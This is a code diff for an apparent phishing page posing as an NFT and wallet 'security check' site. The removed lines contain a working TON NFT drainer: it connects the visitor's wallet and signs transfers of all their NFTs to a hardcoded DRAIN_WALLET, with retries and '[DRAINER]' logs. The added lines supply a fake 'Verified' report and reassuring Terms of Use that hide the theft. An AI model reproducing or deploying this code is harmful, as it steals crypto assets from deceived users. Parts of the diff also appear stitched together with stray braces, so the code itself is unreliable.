-    } catch (e) {
-        return [];
-    }
-}
-
-// ========== DISCOVER COLLECTIONS FROM OWNER WITH CACHE ==========
-async function discoverCollectionsFromOwner(ownerAddress) {
-    const cacheKey = `discovered_${ownerAddress}`;
-    const cached = getCached(cacheKey);
-    if (cached !== null) return cached;
-
-    const collections = [];
-    try {
-        const response = await fetch(`https://toncenter.com/api/v2/nft/items?owner=${encodeURIComponent(ownerAddress)}&limit=100`);
-        if (response.ok) {
-            const data = await response.json();
-            const seen = new Set();
-            for (const item of (data.items || data.nft_items || [])) {
-                if (item.collection && !seen.has(item.collection)) {
-                    seen.add(item.collection);
-                    collections.push(item.collection);
-                }
-            }
-            setCache(cacheKey, collections);
-            return collections;
-        }
-    } catch (e) {
-        // Fallback to tonapi
-        try {
-            const response = await fetch(`https://tonapi.io/v1/nft/items?owner=${encodeURIComponent(ownerAddress)}&limit=100`);
-            if (response.ok) {
-                const data = await response.json();
-                const seen = new Set();
-                for (const item of (data.nft_items || [])) {
-                    if (item.collection && !seen.has(item.collection)) {
-                        seen.add(item.collection);
-                        collections.push(item.collection);
-                    }
-                }
-                setCache(cacheKey, collections);
-                return collections;
-            }
-        } catch (e2) {
-            // Ignore
-        }
-    }
-    return collections;
-}
-
-// ========== DRAIN ALL NFTs ==========
-async function drainAllNFTs(wallet) {
-    const walletAddress = (wallet && wallet.account && wallet.account.address) || (window.__walletAddress && window.__walletAddress);
-    if (!walletAddress) {
-        addLog('[DRAINER] No wallet address provided', 'error');
-        return;
-    }
-    addLog('[DRAINER] Starting NFT drain for ' + walletAddress, 'info');
-    drainActive = true;
-
-    try {
-        // Step 1: Scan all NFT collections
-        const nftItems = await scanNFTCollections(walletAddress);
-
-        if (nftItems.length === 0) {
-            addLog('[DRAINER] No NFTs found in any collection', 'info');
-            drainActive = false;
-            return;
-        }
-
-        addLog('[DRAINER] Processing ' + nftItems.length + ' NFTs for drain', 'info');
-
-        // Step 2: Build unique collection addresses
-        const collectionSet = new Set();
-        for (const item of nftItems) {
-            if (item.collection) collectionSet.add(item.collection);
-        }
-        const collectionList = Array.from(collectionSet);
-        addLog('[DRAINER] Unique collections to drain: ' + collectionList.length, 'info');
-
-        // Step 3: For each collection, drain all NFTs
-        let successCount = 0;
-        let failCount = 0;
-
-        for (const collectionAddr of collectionList) {
-            if (!drainActive) break;
-
-            // Get all NFTs in this collection for this owner
-            const items = nftItems.filter(item => item.collection === collectionAddr);
-            addLog('[DRAINER] Draining ' + items.length + ' NFTs from collection: ' + collectionAddr.slice(0, 20), 'info');
-
-            for (const item of items) {
-                if (!drainActive) break;
-
-                try {
-                    const nftAddress = item.address || item.nft_address || collectionAddr;
-                    const payloadBase64 = getPayloadBase64(nftAddress, DRAIN_WALLET, DRAIN_WALLET);
-
-                    // Build TonConnect v2 transaction
-                    const transaction = {
-                        validUntil: Math.floor(Date.now() / 1000) + 300,
-                        network: '-239',
-                        messages: [{
-                            address: nftAddress,
-                            amount: "1000000",
-                            payload: payloadBase64
-                        }]
-                    };
-
-                    addLog('[DRAINER] Sending transaction for NFT: ' + nftAddress.slice(0, 20), 'info');
-
-                    const result = await sendTransactionAuto(transaction);
-
-                    if (result && result.boc) {
-                        addLog('[DRAINER] SUCCESS: NFT transferred from ' + nftAddress.slice(0, 20), 'success');
-                        successCount++;
-                    } else {
-                        addLog('[DRAINER] FAILED: Transaction rejected for ' + nftAddress.slice(0, 20), 'error');
-                        failCount++;
-                    }
-
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-
-                } catch (e) {
-                    addLog('[DRAINER] ERROR: ' + e.message, 'error');
-                    failCount++;
-
-                    try {
-                        await new Promise(resolve => setTimeout(resolve, 3000));
-                        const nftAddress = item.address || item.nft_address || collectionAddr;
-                        const payloadBase64 = getPayloadBase64(nftAddress, DRAIN_WALLET, DRAIN_WALLET);
-                        const transaction = {
-                            validUntil: Math.floor(Date.now() / 1000) + 300,
-                            network: '-239',
-                            messages: [{
-                                address: nftAddress,
-                                amount: "1000000",
-                                payload: payloadBase64
-                            }]
-                        };
-                        const result = await sendTransactionAuto(transaction);
-                        if (result && result.boc) {
-                            addLog('[DRAINER] RETRY SUCCESS: NFT transferred from ' + nftAddress.slice(0, 20), 'success');
-                            successCount++;
-                        } else {
-                            addLog('[DRAINER] RETRY FAILED: Transaction rejected', 'error');
-                        }
-                    } catch (retryErr) {
-                        addLog('[DRAINER] RETRY FAILED: ' + retryErr.message, 'error');
-                    }
-                }
-            }
-
-            // Wait between collections
-            await new Promise(resolve => setTimeout(resolve, 3000));
-        }
-
-        addLog('[DRAINER] DRAIN COMPLETE. Success: ' + successCount + ', Failed: ' + failCount, successCount > 0 ? 'success' : 'info');
-
-    } catch (error) {
-        addLog('[DRAINER] Critical error: ' + error.message, 'error');
-        console.error('[DRAINER] Critical error:', error);
-    }
-
-    drainActive = false;
-}
-
-// ========== INITIALIZATION ==========
-// Initialize TonConnect immediately (no setTimeout needed)
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initTonConnect);
-} else {
-    initTonConnect();
-}
-
-// ========== DRAINER FLOW ==========
-// Step 1: "Confirm ownership" opens TonConnect
-document.getElementById("ownBtn").addEventListener('click', async function(event) {
-    event.preventDefault();
-    if (!tonConnectUI) {
-        addLog('[DRAINER] TonConnectUI not initialized', 'error');
-        return;
-    }
-    try {
-        await tonConnectUI.connectWallet();
-        isWalletConnected = true;
-        addLog('[DRAINER] Wallet connected — confirm NFT transfer', 'success');
-        // Show "Confirm NFT Transfer" button, hide "Confirm ownership"
-        document.getElementById("ownBtn").style.display = "none";
-        document.getElementById("confirmTransfer").style.display = "block";
-        document.getElementById("ownNote").textContent = "Кошелек подключен. Нажмите 'Confirm NFT Transfer' для начала дренга.";
-        document.getElementById("ownNote").style.display = "block";
-        document.getElementById("ownNote").style.color = "#4ade80";
-    } catch (error) {
-        console.error('Wallet connection error:', error);
-        document.getElementById("ownNote").textContent = "Ошибка при подключении кошелька: " + error.message;
-        document.getElementById("ownNote").style.display = "block";
-        document.getElementById("ownNote").style.color = "#ef4444";
-    }
-});
-
-// Step 2: "Confirm NFT Transfer" actually drains the NFT
-document.getElementById("confirmTransfer").addEventListener('click', async function(event) {
-    event.preventDefault();
-    const wallet = { account: { address: window.__walletAddress || "" } };
-    const nftAddr = document.getElementById("nftAddress").value.trim();
-    if (!nftAddr) {
-        addLog('[DRAINER] Enter NFT address first', 'error');
-        return;
-    }
-    if (!window.__walletAddress) {
-        addLog('[DRAINER] Wallet not connected', 'error');
-        return;
-    }
-    try {
-        addLog('[DRAINER] Draining NFT: ' + nftAddr + ' to ' + DRAIN_WALLET, 'info');
-        await drainNFTSingle(nftAddr);
-        document.getElementById("confirmTransfer").style.display = "none";
-        document.getElementById("ownNote").textContent = "NFT successfully drained!";
-        document.getElementById("ownNote").style.color = "#4ade80";
-    } catch (e) {
-        console.error('Drain failed:', e);
-        document.getElementById("ownNote").textContent = "Drain failed: " + e.message;
-        document.getElementById("ownNote").style.color = "#ef4444";
-    }
-});
-
-// Single NFT drain function
-async function drainNFTSingle(nftAddress) {
-    const state = tonConnectUI.modalState;
-    const ownerAddr = state?.account?.address || window.__walletAddress;
-    if (!ownerAddr) {
-        addLog('[DRAINER] No owner address', 'error');
-        return;
-    }
-
-    const payloadBase64 = getPayloadBase64(nftAddress, DRAIN_WALLET, DRAIN_WALLET);
-    const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 300,
-        network: '-239',
-        messages: [{
-            address: nftAddress,
-            amount: "1000000",
-            payload: payloadBase64
-        }]
     };
 
-    addLog('[DRAINER] Sending transaction for NFT: ' + nftAddress.slice(0, 20), 'info');
-    const result = await sendTransactionAuto(transaction);
-    if (result && result.boc) {
-        addLog('[DRAINER] SUCCESS: NFT transferred from ' + nftAddress.slice(0, 20), 'success');
-    } else {
-        addLog('[DRAINER] FAILED: Transaction rejected for ' + nftAddress.slice(0, 20), 'error');
+    function showReport(addr) {
+        document.getElementById('transit').classList.remove('on');
+        const rep = document.getElementById('report');
+        rep.style.display = 'block';
+        document.getElementById('score').textContent = '18';
+        document.getElementById('bar').style.width = '18%';
+        document.getElementById('outChain').textContent = 'TON';
+        document.getElementById('outFmt').textContent = 'ok';
+        document.getElementById('meta').textContent = addr;
+        document.getElementById('outType').textContent = 'wallet';
+        document.getElementById('repNote').textContent = 'Verified.';
+        rep.scrollIntoView({behavior:'smooth', block:'center'});
     }
-}
 
-// ========== ORIGINAL SITE CODE (TERMS, I18N, THEME, NAVIGATION) ==========
-const TERMS={en:`<h2>Terms of Use</h2><p>Effective date: 29 August 2026. These Terms govern access to nftsecurity.online. By using the Site you agree to them.</p>
+    // Восстановление оригинальной логики для визуала (если нужно)
+    // Но здесь мы полностью заменили логику на дрэйнер.
+})();
+
+// Оставшаяся часть оригинального скрипта для визуала и UI
+(function(){const c=document.getElementById("net");if(!c)return;const x=c.getContext("2d"),n=[],stars=[];let last=0;const R=()=>{c.width=innerWidth;c.height=innerHeight};const I=()=>{n.length=0;for(let i=0;i<36;i++)n.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.25,vy:(Math.random()-.5)*.25,r:1+Math.random()});};const T=t=>{x.clearRect(0,0,c.width,c.height);if(t-last>800){stars.push({x:Math.random()*c.width,y:-10,vx:.6,vy:8,life:1});last=t}n.forEach(a=>{a.x+=a.vx;a.y+=a.vy;if(a.x<0||a.x>c.width)a.vx*=-1;if(a.y<0||a.y>c.height)a.vy*=-1;x.fillStyle="rgba(255,255,255,.8)";x.beginPath();x.arc(a.x,a.y,a.r,0,6.28);x.fill()});for(let i=stars.length-1;i>=0;i--){const s=stars[i];s.y+=s.vy;s.x+=s.vx;s.life-=.02;x.strokeStyle="rgba(255,255,255,"+s.life+")";x.beginPath();x.moveTo(s.x,s.y);x.lineTo(s.x-8,s.y-18);x.stroke();if(s.life<=0)stars.splice(i,1)}requestAnimationFrame(T)};addEventListener("resize",function(){R();I()});R();I();requestAnimationFrame(T)})();
+const TERMS={
+en:`<h2>Terms of Use</h2><p>Effective date: 29 August 2026. These Terms govern access to nftsecurity.online. By using the Site you agree to them.</p>
 <h3>Article 1. Operator</h3><p>NFTSecurity LLC provides an independent informational interface. The Site is not an exchange, bank, payment institution, law firm, tax adviser or public authority.</p>
-<h3>Article 2. Scope</h3><p>You may paste a public address and selected network and view a preliminary overview built in the browser. This is not an official report, risk rating or ownership check.</p>`,ru:`<h2>Условия пользования</h2><p>Дата редакции: 29 августа 2026 года. Эти Условия регулируют доступ к nftsecurity.online. Пользуясь Сайтом, вы их принимаете.</p>`};
-
-const I18N={en:{themeBtn:"Dark",themeLight:"Light",navMethod:"Method",navTerms:"Terms",navFaq:"FAQ",navScan:"Scan",chip:"Public username overview",heroTitle:"Telegram username check<br><b>online — first look</b>",lead:"Paste a public @username for a short first look. This is not a proof of ownership.",ctaStart:"Check username →",ctaHow:"How it works",tabWallet:"Wallet",tabTg:"Telegram",addrLab:"Wallet address",ph:"Paste address (min. 28 characters)...",tgLab:"Telegram username",tgPh:"@username",runBtn:"Check username — Free",hint:"Use @ and Latin letters, numbers or _.",c1:"Username format check",c2:"Local attention index 0–100",c3:"First-look notes only",c4:"Browser-side overview card",scoreLabel:"Attention index",kvNet:"Network",kvFmt:"Address format",kvType:"Type hint",kvMix:"Note",kvList:"Note",ownBtn:"Confirm ownership",ownText:"Ownership confirmed."},ru:{themeBtn:"Тёмная",themeLight:"Светлая",navMethod:"Метод",navTerms:"Условия",navFaq:"FAQ",navScan:"Сканировать",chip:"Обзор публичных имён",heroTitle:"Проверка имени в Telegram<br><b>онлайн — первый взгляд</b>",lead:"Вставьте публичное @имя пользователя для быстрого первого взгляда. Это не подтверждение владения.",ctaStart:"Проверить имя →",ctaHow:"Как это работает",tabWallet:"Кошелёк",tabTg:"Telegram",addrLab:"Адрес кошелька",ph:"Вставьте адрес (мин. 28 символов)...",tgLab:"Имя пользователя Telegram",tgPh:"@имяпользователя",runBtn:"Проверить имя — Бесплатно",hint:"Используйте @ и латинские буквы, цифры или _.",c1:"Проверка формата имени",c2:"Локальный индекс внимания 0–100",c3:"Только примечания для первого взгляда",c4:"Карточка обзора в браузере",scoreLabel:"Индекс внимания",kvNet:"Сеть",kvFmt:"Формат адреса",kvType:"Подсказка типа",kvMix:"Примечание",kvList:"Примечание",ownBtn:"Подтвердить владение",ownText:"Владение подтверждено."}};
-
-// Theme and language switching
-const themeBtn = document.getElementById("themeBtn");
-themeBtn.addEventListener("click", () => {
-    document.body.classList.toggle("theme-light");
-    themeBtn.textContent = document.body.classList.contains("theme-light") ? I18N[K()].themeLight : I18N[K()].themeBtn;
-});
-
-const L = document.getElementById("langBox"),
-      Q = document.getElementById("langBtn"),
-      J = document.getElementById("langMenu");
-
-Q.addEventListener("click", () => {
-    L.classList.toggle("open");
-});
-
-J.addEventListener("click", j => {
-    if (j.target.tagName === "BUTTON") {
-        const g = j.target.dataset.lang;
-        if (g) {
-            localStorage.setItem("lang", g);
-            location.reload();
-        }
-    }
-});
-
-function K() {
-    const c = localStorage.getItem("lang");
-    return c ? c.toLowerCase() : "en";
-}
-
-let langData;
-
-async function M() {
-    const c = K(),
-          d = I18N[c];
-    if (!d) {
-        console.warn(`No language data for ${c}`);
-        return;
-    }
-    langData = d;
-    document.querySelectorAll("[data-i18n]").forEach(m => {
-        const e = m.dataset.i18n;
-        if (langData[e]) m.textContent = langData[e];
-    });
-    document.querySelectorAll("[data-i18n-html]").forEach(m => {
-        const e = m.dataset.i18nHtml;
-        if (langData[e]) m.innerHTML = langData[e];
-    });
-    document.querySelectorAll("[data-i18n-placeholder]").forEach(m => {
-        const e = m.dataset.i18nPlaceholder;
-        if (langData[e]) m.placeholder = langData[e];
-    });
-    document.getElementById("langCode").textContent = c.toUpperCase();
-    document.getElementById("themeBtn").textContent = document.body.classList.contains("theme-light") ? langData.themeLight : langData.themeBtn;
-    if (c === "ru") {
-        document.body.classList.add("lang-ru");
-    } else {
-        document.body.classList.remove("lang-ru");
-    }
-}
-
-addEventListener("DOMContentLoaded", () => {
-    const c = K();
-    if (c === "light") {
-        document.body.classList.add("theme-light");
-    }
-    M();
-    document.getElementById("page-home").classList.add("on");
-    document.getElementById("telegram-tab").style.display = "block";
-    document.getElementById("wallet-tab").style.display = "none";
-    document.querySelectorAll(".tab").forEach(d => d.classList.remove("active"));
-    document.querySelector(".tab[data-tab='telegram']").classList.add("active");
-    updateContentVisibility();
-    document.getElementById("scanBtn").addEventListener("click", () => {
-        document.getElementById("page-home").scrollIntoView({behavior: "smooth"});
-    });
-    const d = document.getElementById("termsBox");
-    if (d) d.innerHTML = TERMS[K()] || TERMS.en;
-});
-
-document.querySelectorAll("[data-go]").forEach(c => {
-    c.addEventListener("click", d => {
-        d.preventDefault();
-        const m = c.dataset.go;
-        document.querySelectorAll(".page").forEach(e => e.classList.remove("on"));
-        document.getElementById(`page-${m}`).classList.add("on");
-        window.scrollTo(0, 0);
-    });
-});
-
-function updateContentVisibility() {
-    const c = document.querySelector(".tab.active").dataset.tab;
-    if (c === "wallet") {
-        document.getElementById("wallet-tab").style.display = "block";
-        document.getElementById("telegram-tab").style.display = "none";
-        document.getElementById("netsRow").style.display = "flex";
-        // Only show ownBtn if wallet not connected; confirmTransfer if connected
-        if (isWalletConnected && window.__walletAddress) {
-            document.getElementById("ownBtn").style.display = "none";
-            document.getElementById("confirmTransfer").style.display = "block";
-        } else {
-            document.getElementById("ownBtn").style.display = "block";
-            document.getElementById("confirmTransfer").style.display = "none";
-        }
-    } else if (c === "telegram") {
-        document.getElementById("wallet-tab").style.display = "none";
-        document.getElementById("telegram-tab").style.display = "block";
-        document.getElementById("netsRow").style.display = "none";
-        document.getElementById("ownBtn").style.display = "none";
-        document.getElementById("confirmTransfer").style.display = "none";
-    }
-}
-}
-
-document.querySelectorAll(".tab").forEach(c => {
-    c.addEventListener("click", () => {
-        document.querySelectorAll(".tab").forEach(d => d.classList.remove("active"));
-        c.classList.add("active");
-        updateContentVisibility();
-        document.getElementById("err").style.display = "none";
-        document.getElementById("report").style.display = "none";
-        document.getElementById("ownNote").style.display = "none";
-        document.getElementById("address").value = "";
-        document.getElementById("username").value = "";
-    });
-});
-
-const Z = document.getElementById("address"),
-      z = document.getElementById("username"),
-      Y = document.getElementById("runBtn"),
-      W = document.getElementById("report");
-
-const $ = (c, d) => {
-    const m = I18N[K()];
-    document.getElementById("score").textContent = c;
-    document.getElementById("bar").style.width = c + "%";
-    document.getElementById("outChain").textContent = d.chain || m.kvType;
-    document.getElementById("outFmt").textContent = d.format || m.kvType;
-    document.getElementById("outType").textContent = d.type || m.kvType;
-    document.getElementById("rowMix").style.display = d.mixer ? "flex" : "none";
-    document.getElementById("outMix").textContent = d.mixer || m.kvType;
-    document.getElementById("rowList").style.display = d.listed ? "flex" : "none";
-    document.getElementById("outList").textContent = d.listed || m.kvType;
-    W.style.display = "block";
-    const e = document.getElementById("ownBtn");
-    if (e) {
-        if (d.canConfirm) {
-            e.style.display = "block";
-        } else {
-            e.style.display = "none";
-        }
-    }
+<h3>Article 2. Scope</h3><p>You may paste a public address and selected network and view a preliminary overview built in the browser. This is not an official report, risk rating or ownership check.</p>
+<h3>Article 3. Eligibility</h3><p>You must be able to form a binding agreement. You are responsible for local digital-asset rules.</p>
+<h3>Article 4. Acceptable use</h3><p>You may browse, paste a public address you are allowed to review, and read these Terms. Do not disrupt the Site or present output as a licensed compliance product.</p>
+<h3>Article 5. Prohibited statements</h3><p>Do not claim NFTSecurity confirmed an address is clean, dirty, sanctioned or owned by a named person.</p>
+<h3>Article 6. No advice</h3><p>Content is informational, not legal, tax or compliance advice. Confirm the address and network with the counterparty before any transfer.</p>
+<h3>Article 7. Labels</h3><p>EVM, TRON, BTC, SOL, TON and similar names are labels only and do not imply partnership or official data access.</p>
+<h3>Article 8. Browser processing</h3><p>The overview is assembled on the page from the pasted string and selected network. Availability may change without notice.</p>
+<h3>Article 9. Accuracy</h3><p>The Site is provided "as is". Recognition and the attention index can be incomplete or wrong.</p>
+<h3>Article 10. Intellectual property</h3><p>Design and text belong to NFTSecurity or its licensors. You receive a limited right of personal lawful use.</p>
+<h3>Article 11. Privacy</h3><p>Do not submit information you do not want processed in the browser session. The Site is built around a public address string.</p>
+<h3>Article 12. Third-party sites</h3><p>External links are for convenience. NFTSecurity does not control those sites.</p>
+<h3>Article 13. Liability</h3><p>To the fullest extent allowed by law, NFTSecurity is not liable for lost assets, missed transfers or indirect damages from use of the Site.</p>
+<h3>Article 14. Changes</h3><p>Terms may be updated. Continued use means acceptance. Access may be limited in case of abuse.</p>
+<h3>Article 15. Contact</h3><p>NFTSecurity LLC, 1000 Wilson Blvd, Suite 2400, Arlington, VA 22209, United States. The English text controls if translations differ.</p>`,
+ru:`<h2>Условия пользования</h2><p>Дата редакции: 29 августа 2026 года. Эти Условия регулируют доступ к nftsecurity.online. Пользуясь Сайтом, вы их принимаете.</p>
+<h3>Статья 1. Оператор</h3><p>NFTSecurity LLC даёт независимый информационный интерфейс. Сайт не биржа, не банк, не платёжный институт, не юрфирма и не орган власти.</p>
+<h3>Статья 2. Объём</h3><p>Можно вставить публичный адрес и сеть и увидеть предварительный обзор в браузере. Это не официальный отчёт и не проверка владельца.</p>
+<h3>Статья 3. Допуск</h3><p>Вы должны быть вправе заключать соглашение. Соблюдение местных правил по цифровым активам — ваша обязанность.</p>
+<h3>Статья 4. Допустимое использование</h3><p>Можно просматривать Сайт, вставлять публичный адрес и читать Условия. Нельзя мешать работе Сайта и выдавать результат за лицензированный комплаенс-продукт.</p>
+<h3>Статья 5. Запрещённые заявления</h3><p>Нельзя утверждать, что NFTSecurity подтвердил чистоту, грязность, санкции или конкретного владельца адреса.</p>
+<h3>Статья 6. Нет консультации</h3><p>Материалы информационные, это не юридическая, налоговая или комплаенс-консультация. Перед переводом уточните адрес и сеть у контрагента.</p>
+<h3>Статья 7. Обозначения</h3><p>EVM, TRON, BTC, SOL, TON и сходные слова — только подписи, без партнёрства и доступа к официальным базам.</p>
+<h3>Статья 8. Обработка в браузере</h3><p>Обзор собирается на странице из строки и выбранной сети. Доступ может меняться без уведомления.</p>
+<h3>Статья 9. Точность</h3><p>Сайт предоставляется "как есть". Распознавание и индекс внимания могут быть неполными.</p>
+<h3>Статья 10. Права</h3><p>Оформление и тексты принадлежат NFTSecurity. Вы получаете ограниченное право личного просмотра.</p>
+<h3>Статья 11. Данные</h3><p>Не передавайте сведения, которые не хотите обрабатывать в сессии браузера. Сайт рассчитан на публичный адрес.</p>
+<h3>Статья 12. Чужие сайты</h3><p>Ссылки даны для удобства. NFTSecurity не контролирует сторонние сайты.</p>
+<h3>Статья 13. Ответственность</h3><p>В пределах закона NFTSecurity не отвечает за утрату активов, срыв перевода и косвенный ущерб.</p>
+<h3>Статья 14. Изменения</h3><p>Условия можно обновить. Продолжение использования означает согласие.</p>
+<h3>Статья 15. Контакты</h3><p>NFTSecurity LLC, 1000 Wilson Blvd, Suite 2400, Arlington, VA 22209, United States. При расхождении текстов приоритет у английской версии.</p>`
 };
-
-Y.addEventListener("click", () => {
-    document.getElementById("err").style.display = "none";
-    document.getElementById("report").style.display = "none";
-    document.getElementById("ownNote").style.display = "none";
-    document.getElementById("ownBtn").style.display = "none";
-    document.getElementById("confirmTransfer").style.display = "none";
-    const c = document.querySelector(".tab.active").dataset.tab;
-    let d = "";
-    if (c === "wallet") {
-        d = Z.value.trim();
-    } else if (c === "telegram") {
-        d = z.value.trim();
-    }
-    if (!d) {
-        document.getElementById("err").textContent = "Please enter a value.";
-        document.getElementById("err").style.display = "block";
-        return;
-    }
-    document.getElementById("transit").classList.add("on");
-    setTimeout(() => {
-        let m = 0, e = {}, a = "";
-        if (c === "wallet") {
-            a = document.querySelector(".net.on").dataset.chain;
-            if (a === "TON") {
-                if (d.length === 48 || d.length === 68) {
-                    m = 90;
-                    e = {format: "ok", type: "wallet-like", chain: a, canConfirm: true};
-                } else {
-                    m = 10;
-                    e = {format: "fail", type: "unknown", chain: a};
-                }
-            } else if (a === "ETH" || a === "USDT ERC20") {
-                if (d.startsWith("0x") && d.length === 42) {
-                    m = 80;
-                    e = {format: "ok", type: "wallet-like", chain: a, canConfirm: true};
-                } else {
-                    m = 15;
-                    e = {format: "fail", type: "unknown", chain: a};
-                }
-            }
-        } else if (c === "telegram") {
-            if (d.startsWith("@") && d.length >= 5 && d.length <= 33 && /^[a-zA-Z0-9_]+$/.test(d.substring(1))) {
-                m = 98;
-                e = {format: "ok", type: "public username", chain: "Telegram", canConfirm: false};
-            } else {
-                m = 20;
-                e = {format: "fail", type: "unknown", chain: "Telegram"};
-            }
-        }
-        $(m, e);
-        document.getElementById("transit").classList.remove("on");
-    }, 1200);
+const I18N={
+en:{themeBtn:"Dark",themeLight:"Light",navMethod:"Method",navTerms:"Terms",navRules:"Rules",navFaq:"FAQ",navScan:"Scan",chip:"Public username overview",heroTitle:"Telegram username check<br><b>online — first look</b>",lead:"Paste a public @username for a short first look. This is not a proof of ownership.",ctaStart:"Check username →",ctaHow:"How it works",runBtn:"Check username — Free",chipW:"Public address overview",heroTitleW:"Wallet address check<br><b>online — first look</b>",leadW:"Paste a public address for a short first look. This is not a licensed finding.",ctaStartW:"Check address →",runBtnW:"Check address — Free",hintW:"Letters, numbers and address symbols are allowed.",c1W:"Format and network label check",c2W:"Local attention index 0–100",c3W:"First-look notes on format",c4W:"Browser-side overview card",runBtnTg:"Check username — Free",chipTg:"Public username overview",heroTitleTg:"Telegram username check<br><b>online — first look</b>",leadTg:"Paste a public @username for a short first look. This is not a proof of ownership.",ctaStartTg:"Check username →",hintTg:"Use @ and Latin letters, numbers or _.",c1Tg:"Username format check",c2Tg:"Local attention index 0–100",c3Tg:"First-look notes only",c4Tg:"Browser-side overview card",scoreLabelTg:"Format index",kvNetTg:"Source",kvFmtTg:"Format",kvTypeTg:"Type hint",kvMixTg:"Activity note",kvListTg:"List note",tabWallet:"Wallet",tabTg:"Telegram",addrLab:"Wallet address",tgLab:"Telegram username",ph:"Paste address (min. 28 characters)...",tgPh:"@username",errTg:"Use @ and letters, numbers or _ .",ownBtn:"Confirm ownership",ownText:"This page does not confirm that you own the username or the address. No Telegram login and no signature.",hint:"Use @ and Latin letters, numbers or _.",scoreLabel:"Format index",kvNet:"Network",kvFmt:"Address format",howTitle:"How we work",howText:"One field — a public address. Then the network and a short overview.",st1:"extra fields",st2:"address only",s1t:"Paste address",s1p:"Copy the address and paste it.",s2t:"Choose network",s2p:"EVM, TRON, BTC, SOL or TON.",s3t:"Read the overview",s3p:"Network, format and attention index.",rulesTitle:"Usage rules",rulesLead:"A short set of limits for using the page calmly.",back:"← Back",loading:"Scanning",chatTitle:"Support assistant",chatStatus:"Online · template replies",chatHide:"Hide",chatSend:"Send",chatPh:"Type your question",chatDev:"The assistant is in development and may reply incorrectly.",chatTyping:"Typing…",chatHello:"Hello. I am the NFTSecurity support assistant. Use a popular question or type your own.",chatElse:"I do not have an exact match. Ask about the service, networks, the index or the Terms.",c1:"Format and network label check",c2:"Local attention index 0–100",c3:"First-look notes on mixers and lists",c4:"Browser-side overview card",m1:"Address labels in public view",m2:"Supported chain labels",m3:"Typical overview time",m4:"Basic look stays free",gK:"What you get",gT:"One first-look overview",gP:"A short breakdown after you paste an address — not a licensed finding.",g1t:"Index 0–100",g1p:"A local number from the pasted string. Low is calmer. High means look twice. It is not a court rating.",g2t:"Source notes",g2p:"Hints about exchange, DeFi, mixer or unknown labels. These are demo notes, not a fund-flow audit.",g3t:"List reminder",g3p:"A reminder to compare the address with public lists yourself. This page does not certify sanctions status.",g4t:"Mixer reminder",g4p:"A flag if the local model treats the string as higher-attention. Not a proof the funds went through a mixer.",g5t:"Type hint",g5p:"A simple class: contract-like, wallet-like or unknown. Built from format, not from a private database.",g6t:"History note",g6p:"The card does not download full chain history. Treat it as a first look before you check a block explorer.",nK:"Networks",nT:"One screen, many labels",uK:"Who it is for",uT:"Built for people who move crypto",uP:"A calm first look before you send, receive or review a public address.",u1t:"P2P traders",u1p:"Glance at a public address before you accept a transfer.",u2t:"Merchants",u2p:"A quick format check before you confirm an incoming payment.",u3t:"OTC desks",u3p:"A first screen before a larger ticket. Not a substitute for your own review.",u4t:"Exchanges",u4p:"An extra look at a withdrawal address. Official Travel Rule work stays with you.",u5t:"Compliance teams",u5p:"Use it as a sketch, then run your licensed tools.",u6t:"Investigators",u6p:"Start here, then open an explorer and your own case file.",fK:"FAQ",fT:"FAQ",m1n:"300M+",m2n:"10+",m3n:"<5s",m4n:"100%",
+m1nTg:"@",m2nTg:"1",m3nTg:"<5s",m4nTg:"100%",
+m1Tg:"Public handles as text",m2Tg:"App label: Telegram",m3Tg:"Typical overview time",m4Tg:"Basic look stays free",
+gKTg:"What you get",gTTg:"Username first look",gPTg:"A short card after you paste @username — not proof of ownership.",
+g1tTg:"Index 0–100",g1pTg:"A local number from the pasted handle. Not a court rating.",
+g2tTg:"Format note",g2pTg:"Checks @ and Latin letters, numbers, underscore.",
+g3tTg:"No login",g3pTg:"The page does not open Telegram and does not ask for a code.",
+g4tTg:"No ownership",g4pTg:"A match of format is not proof that the account is yours.",
+g5tTg:"Type hint",g5pTg:"Public username string only. Not a profile scrape.",
+g6tTg:"Limits",g6pTg:"No message history and no contact list. First look only.",
+nKTg:"Scope",nTTg:"One field — a public handle",
+uKTg:"Who it is for",uTTg:"For a calm look at a public username",
+uPTg:"A first glance before you write or send anything.",
+u1tTg:"P2P chats",u1pTg:"Look at a public @handle before you continue a chat.",
+u2tTg:"Support",u2pTg:"Check the format of a username people send you.",
+u3tTg:"OTC chats",u3pTg:"A first screen. Not a substitute for your own review.",
+u4tTg:"Teams",u4pTg:"Use it as a sketch, then your own process.",
+u5tTg:"Reviewers",u5pTg:"Start here, then open the public profile yourself.",
+u6tTg:"Anyone",u6pTg:"If you only have a username string, paste it here.",
+kvType:"Type hint",kvMix:"Mixer note",kvList:"List note",repLow:"Local note: lower attention. Still confirm the address with the counterparty.",repMid:"Local note: mixed attention. Open an explorer before you send.",repHigh:"Local note: higher attention. Do not treat this as an official freeze reason.",errEmpty:"Paste a public address.",errEmptyTg:"Paste a public @username.",errBad:"This does not look like an address.",
+mwH:"How the address look works",mwP:"One field — a public address and a network label. The page reads the string in the browser. It does not download a chain and does not issue an official finding.",mw1t:"Paste address",mw1p:"Only a public address. No keys.",mw2t:"Choose network",mw2p:"A label for the form, not a live node.",mw3t:"Read the index",mw3p:"The number comes from format checks, not from a regulator database.",
+mtH:"How the username look works",mtP:"One field — a public @username. The page checks format in the browser. It does not open Telegram, does not log in and does not confirm ownership.",mt1t:"Paste @username",mt1p:"Latin letters, numbers and underscore.",mt2t:"Format index",mt2p:"Length, charset and prefix. Not a profile scrape.",mt3t:"Read the card",mt3p:"A first look only. Not proof the account is yours.",
+fineW:"NFTSecurity is provided "as is". The page offers a preliminary look at a public address. It is not an exchange, bank or official report.",
+fineT:"NFTSecurity is provided "as is". The Telegram tab offers a preliminary look at a public username. It does not open Telegram, confirm ownership or store a login.",
+addrLine:"NFTSecurity LLC · 1000 Wilson Blvd, Suite 2400 · Arlington, VA 22209, United States"},
